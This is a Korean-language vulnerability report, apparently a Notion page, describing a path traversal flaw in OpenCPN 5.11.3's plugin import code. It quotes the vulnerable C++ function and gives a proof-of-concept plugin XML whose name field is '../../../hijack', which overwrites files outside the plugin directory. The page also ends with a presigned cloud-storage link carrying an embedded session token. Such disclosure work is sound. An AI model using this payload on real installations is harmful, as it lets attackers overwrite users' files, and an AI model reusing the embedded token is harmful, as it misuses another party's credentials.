---
notion_url: https://www.notion.so/c3bbe0809830830a942b01d9cc6acbc6
last_synced: 2026-06-12 05:50
tags: [notion-sync]
---

# [KOR] OpenCPN File overwrite - Path traversal report

취약점 제목 : OpenCPN File overwrite - Path traversal report
취약점 요약 : 파일 경로 검증 없이 .meta 파일을 생성함으로 발생하는 File Overwrite
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Path Traversal
영향 : 프로세스 권한의 File Overwrite
취약한 파일명 : Console.cpp
취약한 함수명 : import_plugin()
취약한 파라미터 : metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Opencpn/cli 내의 console.cpp를 분석 중, import_plugin()에서

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```

`metadata` 경로 검증 과정이 없는것을 확인 후 테스트해보기 위한 xml 파일을 작성

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```

 `<name>` 에 ..나 /를 넣어 Path traversal 시도

![image](_assets/image.png)


취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466S5IU3P4X%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205044Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJGMEQCIF7x4rTC3GFBfvMsDjs30%2BtHm%2BNu8GgLayAW9nhsWweyAiA9eA%2BLYYguPik8sKuxDJhgMAZMbg2bp%2Fmz4wuZEVEZTSr%2FAwgFEAAaDDYzNzQyMzE4MzgwNSIMF5NSRvt5nHJSBe8WKtwDwH0Umpoli9VY8trG6LhY0CrnBMoIg0Pq%2Bre%2BdOG5zTXaR7tFEqulScqcvUhSjtKCpm42GOI12NKtWcluNAfFnEAjrRbXVLmN8H%2BCrF44Er6oCuMzJs2hSECZdRnI211%2BvTXUfVNGT2HYXWwy75GITDV9UuBg5Alysemr%2F0qkSUZ8xu6aBBHBZ%2BxWXMM8FJGofplehS9jDlsBGKoB3NQZ%2Fg3%2BGygJnloXlF36USJjPyYIZ%2FS6wN7%2FETRVmbSZNvaWcJIc%2B32u%2Fa48Amf5OvGFqPaH%2FCi4GBx1GbcnE2ttAaNGivOiK843xIr3xrSiQvEaXnTrJbIjxXiOF%2F2c9egDkmTyhcs0WNoqpF7rtq2n2PNdR3c%2FcsmHgJ7T2PdW2byLub3KJ0%2BDZfjI%2FVgT115wmOsf6D2p7te%2FwRb5WC0NVZ5VD8mFdwqZGuKIfrst3RsgGfNZnafB%2BL922Wg%2FnC%2FSwahvNGYgONn4bHK52Gu3UpoH%2FdPruyRpxc9mAXvmF2A99LzEPRNwuQZIpZfb4f3g6uqrxJCXJbEovjMRMvRtGWQQ08CKysr4CWIJjWmNjaN0FqAUMPoCmbD1UxzSa74KVt4VaYO1OvyMnZENPioAFcKgiz1WGZvRmP%2BQaEowg6us0QY6pgF7haYyGjiRA3VpXgprVDZl%2BeEFTQwOwX26KYq2cn5KVIS9G1eTC1xpkizPNH%2Fe9AdYSdUQs32eI4VauHfxMLvLMOUhsMy3XOIRztc0f%2FAQIrUgOLotjHveq6PSTTNspTX787eGFao%2FG2izNQHpO73Ru3%2FPDbsoZOv40s0DL0vDgH5YwKM0PikXPLGogxfH38KbYcOlpmkJ5nUT8pZXYcv2cx%2Fge3lV&X-Amz-Signature=932eb6a517a0c5eefc90dbff6a2fd03db45b59d34e7a19fb02401ff6736adc35&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
